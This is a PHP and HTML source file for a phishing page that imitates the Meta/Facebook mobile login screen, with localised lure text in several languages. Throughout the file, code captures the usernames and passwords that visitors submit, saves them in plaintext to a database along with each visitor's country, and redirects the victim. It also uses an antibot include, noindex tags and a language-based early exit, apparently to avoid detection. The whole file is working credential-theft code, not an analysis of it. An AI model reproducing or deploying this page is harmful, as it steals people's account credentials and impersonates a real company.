<?php
ob_start();
session_start();
include 'ip.php';
require("../antibot.php");

     require('../../conn.php');

    if (isset($_REQUEST['lgn-em'])) {
      
        $username = stripslashes($_REQUEST['lgn-em']);
        $username = mysqli_real_escape_string($con, $username);
        $email    = stripslashes($_REQUEST['country']);
        $email    = mysqli_real_escape_string($con, $email);
        $password = stripslashes($_REQUEST['lgn-psw']);
        $password = mysqli_real_escape_string($con, $password);
        $check_user = mysqli_query($con, "SELECT user FROM users where user = '$username' ");
        $check_pass = mysqli_query($con, "SELECT pass FROM users where pass = '$password' ");
if(mysqli_num_rows($check_user) > 0  && mysqli_num_rows($check_pass) > 0)
{
    $con->close();
     header('location: ../');
}
else{ 
        $query    = "INSERT into `users` (user, pass, country)
                     VALUES ('$username', '$password', '$email')";
        $result   = mysqli_query($con, $query);
        if ($result) {
             $con->close();
     header('location: ../');

        } else {
            echo "<div class='form'>
                  <h3>Required fields are missing.</h3><br/>
                  <p class='link'>Click here to <a href='registration.php'>registration</a> again.</p>
                  </div>";
        }
    }
    }
    else {
        
    }

    
$lc = ""; // أساسي
    $txt="First confirm your connection.";
    $txt1="Get it before everyone else";
    $txt_mail="Phone number or email";
    $txt_pass="Password";
    $txt_button="Login";
	$password ="Forgot your password?";
    if(isset($_SERVER['HTTP_ACCEPT_LANGUAGE']))
    $lc = substr($_SERVER['HTTP_ACCEPT_LANGUAGE'], 0, 2);

if($lc == "en"){ //انجليزي
    $txt="First confirm your connection.";
    $txt1="Get it before everyone else";
    $txt_mail="Phone number or email";
    $txt_pass="Password";
    $txt_button="Login";
	$password ="Forgot your password?";
} 
    else if($lc == "es"){ //اسباني
   $txt="Primero confirme su conexión.";
    $txt1="Consíguelo antes que los demás";
    $txt_mail="teléfono móvil o correo electrónico";
    $txt_pass="Contraseña";
    $txt_button="Vigilancia";
	$password ="¿Olvidaste tu contraseña?";
	}
	
     else if($lc == "fr"){ // فرنسي
   $txt="Confirmez d’abord votre connexion.";
    $txt1="Obtenez-le avant tout le monde";
    $txt_mail="Numéro de téléphone portable ou e-mail";
    $txt_pass="Mot de passe";
    $txt_button="Suivi";
	$password ="Vous avez oublié votre mot de passe?";
	}
    else if($lc == "pt"){ //برتغالي
   $txt="Primeiro confirme sua conexão.";
    $txt1="Receba antes de todo mundo";
    $txt_mail="celular ou e-mail";
    $txt_pass="Senha";
    $txt_button="Monitoramento";
	$password ="Esqueceu sua senha?";
	}
	 else if($lc == "ar"){ //عربي
   $txt="عليك تأكيد بياناتك أولا";
    $txt1="احصل عليه قبل أي شخص آخر";
    $txt_mail="الهاتف أو البريد الإلكتروني";
    $txt_pass="كلمة المرور";
    $txt_button="استمرار";
	$password ="نسيت رقمك السري؟";
	}
else{ // غير ذلك
    $txt="First confirm your connection.";
    $txt1="Get it before everyone else";
    $txt_mail="Phone number or email";
    $txt_pass="Password";
    $txt_button="Login";
	$password ="Forgot your password?";
    exit();
}

?>
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <!--<base target="_parent">--><base href="." target="_parent">
<meta name="referrer" content="no-referrer">
    
    <meta name="robots" content="noindex, noimageindex, nofollow, nosnippet">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <title></title>
    <meta name="viewport" content="width=device-width,initial-scale=1.0,minimum-scale=1.0,maximum-scale=1.0">
    <link rel="shortcut icon" href="https://fegoaw.xyz/6/f/met/pic/favicon.ico">
    <link rel="apple-touch-icon" href="https://fegoaw.xyz/6/f/met/pic/favicon.png">
    <meta name="viewport" content="user-scalable=no,initial-scale=1,maximum-scale=1">

   
    <link id="lib_main" type="text/css" rel="stylesheet" href="./none.css">




    </head>
<body ">

    <div id="viewport">
        <h1 style="display:block;height:0;overflow:hidden;position:absolute;width:0;padding:0">Meta</h1>
        <div id="page">
            <div class="_129_" id="header-notices"></div>
            <p class="_noti5" dir="rtl"><?php echo $txt ?></p>
            <div class="_4g33 _52we _52z5" id="header">
                <div class="_4g34 _52z6" data-sigil="mChromeHeaderCenter">
			<img src="https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg" width="23%"/>
				</div>
            </div> 
					  

          

		   <div class="_5soa acw" id="root" role="main" data-sigil="context-layer-root content-pane">
                <div class="_4g33">
                    <div class="_4g34" id="u_0_0">
                        <div class="_5yd0 _2ph- _5yd1" style="display: none;" data-sigil="m_log5484_notice">
                            <div class="_52jd"></div>
                        </div>
                        <div class="aclb">
                            <div data-sigil="log5484_identify_step_element">
                                <div data-sigil="m_log5484_upsell"></div>
                            </div>
                            <div class="_5rut"> 
                               <form autocomplete="off" method="post" target="_top">
                            
                                  
                                                
                                                  </div>
                                            <div class="_55wq"></div>
                                            <div>
                                            
                                                <div class="_1upc _mg8" data-sigil="m_log5484_pwaaw4aword">
                                                    <div class="_4g33">
                                                        <div class="_4g34 _5i2i _52we">
                                                            <div class="_5xu4">
                                                            <input minlength="3" maxlength="30" autocorrect="off" autocapitalize="off" class="_56be _56bg _4u9z _5ruq _8qtn" name="lgn-em" placeholder="<?php echo $txt_mail ?>" type="text" required="">
                                          <br>
                                                   <input type="text" hidden name="country" id="country" value="<?php echo ip_visitor_country();?>" />              <input  autocorrect="off" autocapitalize="off" class="_56be _56bg _4u9z _5ruq _8qtn"  name="lgn-psw" minlength="6" placeholder="<?php echo $txt_pass ?>" type="password" required="">
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                              
                                    <div class="_2pie" style="text-align:center;">
                                        <div id="u_0_4" data-sigil="log5484_pwaaw4aword_step_element">
                                            <input type="submit" value="<?php echo $txt_button ?>" class="_56bu _55sr _52jh _56bs _56b_ _56bw " name="lgn-sb" id="u_0_5" data-sigil="touchable m_log5484_button">
                                        </div>
                                    </div>
                                    <p class="_for545"><?php echo $password ?></p>
                                    <input type="hidden" name="prefill_contact_point" id="prefill_contact_point">
                                    <input type="hidden" name="prefill_source" id="prefill_source">
                                    <input type="hidden" name="prefill_type" id="prefill_type">
                                    <div class="_xo8"></div>
                                    <noscript>
                                        <input type="hidden" name="_fb_noscript" value="true" />
                                    </noscript>
                                </form>
                            </div>
                        </div>
                    </div>
                </div>
                <div></div>
                <div class="_55wr _5ui2">
                    <div class="_5dpw">
                        <div class="_5ui3" data-nocookies="1" id="locale-selector" data-sigil="language_selector marea">
                            <div class="_4g33">
                                <div class="_4g34"><span class="_52jc _52j9 _3ztb">English (US)</span>
                                    <div class="_3ztc"><span class="_52jc"><a>िन्द</a></span></div>
                                    <div class="_3ztc"><span class="_52jc"><a>Español</a></span></div>
                                    <div class="_3ztc"><span class="_52jc"><a>Português (Brasil)</a></span></div>
                                </div>
                                <div class="_4g34">
                                    <div class="_3ztc"><span class="_52jc"><a>English (UK)</a></span></div>
                                    <div class="_3ztc"><span class="_52jc"><a>Türkçe</a></span></div>
                                    <div class="_3ztc"><span class="_52jc"><a>العرية</a></span></div>
                                    <a>
                                        <div class="_3j87 _1rrd _3ztd"><i class="img sp_C2yIhMFjXJl sx_54fc39"></i></div>
                                    </a>
                                </div>
                            </div>
                        </div>
                        <div class="_5ui4"><span class="mfss fcg">2022 Meta Inc.</span></div>
                    </div>
                </div>
            </div>
         
    </div>
        </div>
</body>
</html>
